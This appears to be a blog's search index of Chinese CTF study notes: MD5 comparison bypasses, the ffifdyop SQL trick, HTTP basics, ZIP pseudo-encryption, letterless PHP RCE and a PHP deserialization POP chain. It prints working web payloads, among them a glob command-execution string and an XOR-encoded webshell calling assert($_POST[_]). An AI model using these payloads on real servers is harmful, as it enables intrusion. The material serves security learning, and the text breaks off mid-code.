<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CRLF注入</title>
      <link href="/2021/11/27/CRLF%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/11/27/CRLF%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hash函数md绕过</title>
      <link href="/2021/11/08/hash%E5%87%BD%E6%95%B0md%E7%BB%95%E8%BF%87/"/>
      <url>/2021/11/08/hash%E5%87%BD%E6%95%B0md%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="强弱类型比较"><a href="#强弱类型比较" class="headerlink" title="强弱类型比较"></a>强弱类型比较</h1><h2 id="强类型比较"><a href="#强类型比较" class="headerlink" title="强类型比较"></a>强类型比较</h2><p>严格比较就是强类型比较a==b弱类型比较会将a和b转成统一数据类型进行比较，而强类型比较会先判断a和b是不是相同类型，不是则会返回false，是，再比较a和b的值。</p><h2 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h2><p>松散比较也就是弱类型比较。</p><h1 id="Md5绕过"><a href="#Md5绕过" class="headerlink" title="Md5绕过"></a>Md5绕过</h1><h2 id="1-0e绕过"><a href="#1-0e绕过" class="headerlink" title="1. 0e绕过"></a>1. 0e绕过</h2><p>弱比较会把0exxx当作科学计数法，不管后面的值是什么，都将看为0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">一些关于md5值以0e开头</span><br><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s21587387a</span><br></pre></td></tr></table></figure><h2 id="2-数组绕过"><a href="#2-数组绕过" class="headerlink" title="2.数组绕过"></a>2.数组绕过</h2><p>md5（）函数计算的是一个字符串的哈希值，对于数组放回则是false</p><p><code>payload:?a[]=1&amp;b[]=2</code></p><h1 id="MD5强类型绕过"><a href="#MD5强类型绕过" class="headerlink" title="MD5强类型绕过"></a>MD5强类型绕过</h1><h2 id="1、"><a href="#1、" class="headerlink" title="1、"></a>1、</h2><p>因为强类型比较，不仅比较值，还比较类型，0e会被当做字符串，所以不能用0e来进行<br>但是我们可以用MD值完全相同的字符来进行绕过</p><h2 id="2、数组绕过"><a href="#2、数组绕过" class="headerlink" title="2、数组绕过"></a>2、数组绕过</h2><p>同上</p><h1 id="特定条件下的MD验证绕过：ffifdyop"><a href="#特定条件下的MD验证绕过：ffifdyop" class="headerlink" title="特定条件下的MD验证绕过：ffifdyop"></a>特定条件下的MD验证绕过：ffifdyop</h1><p>源码</p><p><code>Select * from &#39;admin&#39; whre password=md5()$pass,true)</code></p><p>首先要知道md($pass,true)的含义</p><p><img src="https://img-blog.csdnimg.cn/df665340ba144e519cd2f28e0ffe7aff.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzMzMjY5NQ==,size_12,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>MD5报文将以原始 16字符二进制格式返回</p><p>ffifdyop 字符串经过MD5加密后为276f722736c95d99e921722cf9ed621c<br>在转换成字符串为’or’6乱码</p><p>Select * from ’admin’ where password=‘or’6乱码<br>相当于万能密码</p>]]></content>
      
      
      
        <tags>
            
            <tag> Md5绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>include文件包含解决以及例题</title>
      <link href="/2021/11/07/include%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%A7%A3%E5%86%B3%E4%BB%A5%E5%8F%8A%E4%BE%8B%E9%A2%98/"/>
      <url>/2021/11/07/include%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%A7%A3%E5%86%B3%E4%BB%A5%E5%8F%8A%E4%BE%8B%E9%A2%98/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HTTP和HTTPS以及工具的使用</title>
      <link href="/2021/11/02/HTTP%E5%92%8CHTTPS%E4%BB%A5%E5%8F%8A%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/11/02/HTTP%E5%92%8CHTTPS%E4%BB%A5%E5%8F%8A%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><p>HTTP协议是超文本传输协议的缩写，用于万维网服务器传输超文本到本地浏览器的传送协议，是一个基于TCP/IP通信协议来传递数据</p><h2 id="HTTP工作原理"><a href="#HTTP工作原理" class="headerlink" title="HTTP工作原理"></a>HTTP工作原理</h2><ol><li>HTTP协议工作在服务端和客服端的架构上。浏览器作为http的服务端通过url向http服务器（web服务器发送所有请求）。</li><li>http服务器（web服务器）：Nginx服务器、Apache服务器、IIS服务器等。</li><li>Web服务器根据收到的请求，向客户端发送响应的信息。</li><li>HTTP默认端口80或8080 HTTPS默认端口443。</li></ol><h2 id="HTTP注意事项"><a href="#HTTP注意事项" class="headerlink" title="HTTP注意事项"></a>HTTP注意事项</h2><p>HTTP是无连接的：每次连接只处理一个请求，既客户端连接服务端后，服务端返回，就断开连接。节约传输时间。</p><p>HTTP是媒体独立的：意味着，只有客服端和服务端知道如何处理的数据内容，<strong>任何类型的数据</strong>都可以通过HTTP发送。客户端以及服务器指定使用适合的MIME-type内容类型。</p><p>HTTP是无状态：与第一条相似，HTTP协议是无状态协议，既无记忆能力，每次对数据处理，都是崭新的数据，但是这可能会导致每次传送连接数据量增大。另一方面，在服务器不需要先前信息时它的应答就比较快。</p><p><img src="https://img-blog.csdnimg.cn/20200606174104101.gif" alt="img"></p><p>HTTP通讯原理的流程，浏览器通过http协议完成http服务器然后经过CGI程序处理数据。</p><h2 id="HTTP消息结构"><a href="#HTTP消息结构" class="headerlink" title="HTTP消息结构"></a>HTTP消息结构</h2><p>HTTP使用统一资源标识符（URL）来传输数据和建立连接。</p><p>一但建立连接之后，数据消息就通过类似Internet邮件所使用的格式和多用途Internet邮件扩展（MIME）发送。</p><h2 id="客户端请求信息"><a href="#客户端请求信息" class="headerlink" title="客户端请求信息"></a>客户端请求信息</h2><p>客户端发送一个HTTP协议请求到服务器的请求消息包括以下格式：请求行（request line）、请求头部(header)、空行和请求数据四个部分组成。</p><p><img src="https://img-blog.csdnimg.cn/20200606174736435.png" alt="img"></p><p><strong><img src="https://img-blog.csdnimg.cn/20200606175713363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xhZHlfa2lsbGVyOQ==,size_16,color_FFFFFF,t_70" alt="img"></strong></p><h2 id="服务器响应消息"><a href="#服务器响应消息" class="headerlink" title="服务器响应消息"></a>服务器响应消息</h2><p>HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。</p><p><strong>实例：</strong></p><p>python代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line">url = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(url)</span><br><span class="line"><span class="comment"># 添加请求的url和方法</span></span><br><span class="line">req = urllib.request.Request(url,method=<span class="string">&quot;GET&quot;</span>)</span><br><span class="line"><span class="comment"># 接收响应数据</span></span><br><span class="line">returnDate = urllib.request.urlopen(req)</span><br><span class="line">res_json = returnData.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(res_json)</span><br></pre></td></tr></table></figure><h2 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h2><p>GET、POST、HEAD、OPTIONS、PUT、PATCH、DELETE、TRACE和CONNECT方法。</p><table><thead><tr><th>序号</th><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td>GET</td><td>请求指定的页面信息，并返回实体主体。</td></tr><tr><td>2</td><td>HEAD</td><td>类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头</td></tr><tr><td>3</td><td>POST</td><td>向指定资源提交数据进行处理请求（例如，提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立或已有资源的修改。</td></tr><tr><td>4</td><td>PUT</td><td>从客户端向服务器传送的数据取代指定的文档的内容。</td></tr><tr><td>5</td><td>DELETE</td><td>请求服务器删除指定的页面。</td></tr><tr><td>6</td><td>CONNECT</td><td>HTTP/1.1 协议中预留给能够将连接改为管道方式的代理服务器。</td></tr><tr><td>7</td><td>OPTIONS</td><td>允许客户端查看服务器的性能。</td></tr><tr><td>8</td><td>TRACE</td><td>回显服务器收到的请求，主要用于测试或诊断。</td></tr><tr><td>9</td><td>PATCH</td><td>是对 PUT 方法的补充，用来对已知资源进行局部更新 。</td></tr></tbody></table><p> GET和POST的区别</p><pre><code>GET在浏览器回退时是无害的，而POST会再次提交请求。GET产生的URL地址可以被Bookmark，而POST不可以。GET请求会被浏览器主动cache，而POST不会，除非手动设置。GET请求只能进行url编码，而POST支持多种编码方式。GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。GET请求在URL中传送的参数是有长度限制的，而POST没有。对参数的数据类型，GET只接受ASCII字符，而POST没有限制。GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。GET参数通过URL传递，POST放在Request body中。</code></pre><p>HTTP的底层是TCP/IP。所有GET和POST能做的事情是一样的</p><p>也就是本质上是没什么区别的，但是两者中最大的区别就是:</p><p><strong>GET产生一个TCP数据包；POST产生两个TCP数据包</strong></p><p>具体点来说就是：</p><p>对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）；</p><p>而对于POST，浏览器先发送header，服务器响应100 continue,浏览器再发送data，服务器响应200ok（返回数据）。</p><h2 id="HTTP状态码"><a href="#HTTP状态码" class="headerlink" title="HTTP状态码"></a>HTTP状态码</h2><p>HTTP状态码分类</p><table><thead><tr><th>分类</th><th>分类描述</th></tr></thead><tbody><tr><td>1**</td><td>信息，服务器收到请求，需要请求者继续执行操作</td></tr><tr><td>2**</td><td>成功，操作被成功接收并处理·</td></tr><tr><td>3**</td><td>重定向。需要进一步的操作以完成请求</td></tr><tr><td>4**</td><td>客户端错误，请求包含语法错误或无法完成请求</td></tr><tr><td>5**</td><td>服务端错误，服务器在处理i请求的过程中发生了错误</td></tr></tbody></table><p>其余的可以更具遇到积累。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 通讯原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE无字母数字总结</title>
      <link href="/2021/10/28/RCE%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E6%80%BB%E7%BB%93/"/>
      <url>/2021/10/28/RCE%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="RCE-无数字和字母总结"><a href="#RCE-无数字和字母总结" class="headerlink" title="RCE 无数字和字母总结"></a>RCE 无数字和字母总结</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">  $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">  if(!preg_match(&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c)) &#123;</span><br><span class="line">    system($c);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目一般是这样的，我们可以看到preg_match()函数对传入的字母以及数字进行了过滤，我们可以用以下几种方式来进行过滤。</p><h2 id="1-构造数据包"><a href="#1-构造数据包" class="headerlink" title="1. 构造数据包"></a>1. 构造数据包</h2><p>首先我们大概思路是这样的，我们的get传参的数据既然被过滤掉了，我们可以通过post文件，在上传的过程中，通过<code>。</code>去执行这个文件。</p><p><strong>通过.去执行的文件是不需要有执行权限的</strong></p><p>数据包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>然后bp抓包。</p><p>然后再文件中构造一个<code> ?c=.+/???/????????[@-[]</code></p><p>用到Linux下的glob通道符：</p><p><img src="https://img-blog.csdnimg.cn/20201101200709838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>介绍一下bin目录:</p><p>bin为binary的简写主要放置一些 系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等，也就是一些系统命令都在bin 目录下</p><p>在这里再解释一下为什么加上#！ #!的意思是调用 /bin/sh 命令所以需要加</p><p><img src="https://img-blog.csdnimg.cn/20201101200430332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>然后就可以使用#!调用bin/sh命令绕过数字和字母了。</p><h2 id="2-取反"><a href="#2-取反" class="headerlink" title="2.取反"></a>2.取反</h2><ol><li>php中对汉字可以去乱码，但大多数包含一个字母，我们可以通过这种话方法获得字母。</li></ol><h2 id="3-异或"><a href="#3-异或" class="headerlink" title="3. 异或"></a>3. 异或</h2><p>当过滤掉字母和数字时，我们可以通过异或来取字母大概啥这样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a:&#x27;%40&#x27;^&#x27;%21&#x27; ; s:&#x27;%7B&#x27;^&#x27;%08&#x27; ; s:&#x27;%7B&#x27;^&#x27;%08&#x27; ; e:&#x27;%7B&#x27;^&#x27;%1E&#x27; ; r:&#x27;%7E&#x27;^&#x27;%0C&#x27; ; t:&#x27;%7C&#x27;^&#x27;%08&#x27;</span><br><span class="line">P:&#x27;%0D&#x27;^&#x27;%5D&#x27; ; O:&#x27;%0F&#x27;^&#x27;%40&#x27; ; S:&#x27;%0E&#x27;^&#x27;%5D&#x27; ; T:&#x27;%0B&#x27;^&#x27;%5F&#x27;</span><br><span class="line">拼接起来：</span><br><span class="line">$_=(&#x27;%40&#x27;^&#x27;%21&#x27;).(&#x27;%7B&#x27;^&#x27;%08&#x27;).(&#x27;%7B&#x27;^&#x27;%08&#x27;).(&#x27;%7B&#x27;^&#x27;%1E&#x27;).(&#x27;%7E&#x27;^&#x27;%0C&#x27;).(&#x27;%7C&#x27;^&#x27;%08&#x27;);  // $_=assert</span><br><span class="line">$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;%5D&#x27;).(&#x27;%0F&#x27;^&#x27;%40&#x27;).(&#x27;%0E&#x27;^&#x27;%5D&#x27;).(&#x27;%0B&#x27;^&#x27;%5F&#x27;);  // $__=_POST</span><br><span class="line">$___=$$__; //$___=$_POST</span><br><span class="line">$_($___[_]);//assert($_POST[_]);</span><br><span class="line">放到一排就是：</span><br><span class="line">$_=(&#x27;%40&#x27;^&#x27;%21&#x27;).(&#x27;%7B&#x27;^&#x27;%08&#x27;).(&#x27;%7B&#x27;^&#x27;%08&#x27;).(&#x27;%7B&#x27;^&#x27;%1E&#x27;).(&#x27;%7E&#x27;^&#x27;%0C&#x27;).(&#x27;%7C&#x27;^&#x27;%08&#x27;);$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;%5D&#x27;).(&#x27;%0F&#x27;^&#x27;%40&#x27;).(&#x27;%0E&#x27;^&#x27;%5D&#x27;).(&#x27;%0B&#x27;^&#x27;%5F&#x27;);$___=$$__;$_($___[_]);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web bug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZIP伪加密</title>
      <link href="/2021/10/28/ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/"/>
      <url>/2021/10/28/ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h1><p>zip伪造加密，首先我们要先知道，压缩包的各个部分</p><p><strong>压缩源文件数据区：</strong><br>50 4B 03 04：这是头文件标记（0x04034b50）<br> 14 00：解压文件所需 pkware 版本<br> 00 00：全局方式位标记（有无加密） 头文件标记后2bytes<br> 08 00：压缩方式<br> 5A 7E：最后修改文件时间<br> F7 46：最后修改文件日期<br> 16 B5 80 14：CRC-32校验（1480B516）<br> 19 00 00 00：压缩后尺寸（25）<br> 17 00 00 00：未压缩尺寸（23）<br> 07 00：文件名长度<br> 00 00：扩展记录长度<br> 6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500<br><strong>压缩源文件目录区：</strong> </p><p>50 4B 01 02：目录中文件文件头标记(0x02014b50) </p><p>3F 00：压缩使用的 pkware 版本</p><p>14 00：解压文件所需 pkware 版本<br> 00 00：全局方式位标记（有无加密，伪加密的关键） 目录文件标记后4bytes<br> 08 00：压缩方式<br> 5A 7E：最后修改文件时间<br> F7 46：最后修改文件日期<br> 16 B5 80 14：CRC-32校验（1480B516）<br> 19 00 00 00：压缩后尺寸（25）<br> 17 00 00 00：未压缩尺寸（23）<br> 07 00：文件名长度<br> 24 00：扩展字段长度<br> 00 00：文件注释长度<br> 00 00：磁盘开始号<br> 00 00：内部文件属性<br> 20 00 00 00：外部文件属性 </p><p>00 00 00 00：局部头部偏移量</p><p>6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001<br><strong>压缩源文件目录结束标志：</strong><br> 50 4B 05 06：目录结束标记<br> 00 00：当前磁盘编号<br> 00 00：目录区开始磁盘编号<br> 01 00：本磁盘上纪录总数<br> 01 00：目录区中纪录总数<br> 59 00 00 00：目录区尺寸大小 </p><p>3E 00 00 00：目录区对第一张磁盘的偏移量</p><p>00 00：ZIP 文件注释长度</p><p> 这个详细的介绍了各部分的含义，修改其压缩源文件目录区的全布局方式标记比特值之后即可对文件加密或解密。</p><h2 id="真加密与伪加密"><a href="#真加密与伪加密" class="headerlink" title="真加密与伪加密"></a>真加密与伪加密</h2><p>其实上面也说了真加密和伪加密容易出现的位置，首先压缩文件数字区中全局变量中00是否为90，这里是判断加密的条件之一，但是当压缩文件数字区为90时，压缩文件目录区应该也为90</p><p>题目中很容易出现，压缩文字目录区为90，而压缩文字数字区为00，这种情况也就是伪加密，所以当我们遇到这种情况要按照相应的位置进行修改。</p><h3 id="无加密"><a href="#无加密" class="headerlink" title="无加密"></a>无加密</h3><p>压缩源文件数据区的全局加密应当为<code>00 00</code> （504B0304两个bytes之后）<br> 且压缩源文件目录区的全局方式位标记应当为<code>00 00</code>（504B0304四个bytes之后）</p><h3 id="假加密"><a href="#假加密" class="headerlink" title="假加密"></a>假加密</h3><p>压缩源文件数据区的全局加密应当为<code>00 00</code><br> 且压缩源文件目录区的全局方式位标记应当为<code>09 00</code></p><h3 id="真加密"><a href="#真加密" class="headerlink" title="真加密"></a>真加密</h3><p>压缩源文件数据区的全局加密应当为<code>09 00</code><br> 且压缩源文件目录区的全局方式位标记应当为<code>09 00</code> </p>]]></content>
      
      
      
        <tags>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化（phar://）</title>
      <link href="/2021/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88phar-%EF%BC%89/"/>
      <url>/2021/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88phar-%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="php序列化和反序列化"><a href="#php序列化和反序列化" class="headerlink" title="php序列化和反序列化"></a>php序列化和反序列化</h1><h2 id="pop链和phar-协议"><a href="#pop链和phar-协议" class="headerlink" title="pop链和phar://协议"></a>pop链和phar://协议</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">error_reporting(1);</span><br><span class="line">class Read &#123;</span><br><span class="line">    public $var;</span><br><span class="line">    public function file_get($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        return $text;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $content = $this-&gt;file_get($this-&gt;var);</span><br><span class="line">        echo $content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo $this-&gt;source.&#x27;Welcome&#x27;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;str[&#x27;str&#x27;]-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function _show()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&#x27;/gopher|http|ftp|https|dict|\.\.|flag|file/i&#x27;,$this-&gt;source)) &#123;</span><br><span class="line">            die(&#x27;hacker&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            highlight_file($this-&gt;source); </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;hello&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    unserialize($_GET[&#x27;hello&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    $show = new Show(&#x27;pop3.php&#x27;);</span><br><span class="line">    $show-&gt;_show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面是一个flag.php的源码</p><ol><li>首先看到unserialize($_GET[‘hello’])将get传参的hello进行了反序列化操作。那么将会调用到Show类中__wakeup方法。（在反序列化时进行调用）</li><li>因为this -&gt; source = “index.php” source被当作字符串所以调用Show类中的_to string.</li><li><code>return $this-&gt;str[&#39;str&#39;]-&gt;source</code>source属性不存在所以调用Test类中的get方法。</li><li><code>$function = $this-&gt;p; return $function;</code>把取出来的p当作还是调用因此优惠引起调用了Read类中_invoke方法，其中还就可以把文件读取出来了。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Show&#123;</span><br><span class="line">public $source;</span><br><span class="line">public $str;</span><br><span class="line">&#125;</span><br><span class="line">class Test &#123;</span><br><span class="line">public $p;</span><br><span class="line">&#125;</span><br><span class="line">class Read&#123;</span><br><span class="line">publc $var = &quot;flag.php&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s = new Show();</span><br><span class="line">$t = new Test();</span><br><span class="line">$r = new Read();</span><br><span class="line">$t -&gt; p = $r;</span><br><span class="line">$s -&gt;str[&quot;str&quot;] = $t;</span><br><span class="line">$s -&gt; source = $s;</span><br><span class="line">var_dump(serialize($s));</span><br></pre></td></tr></table></figure><p>还有一个简单的例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span 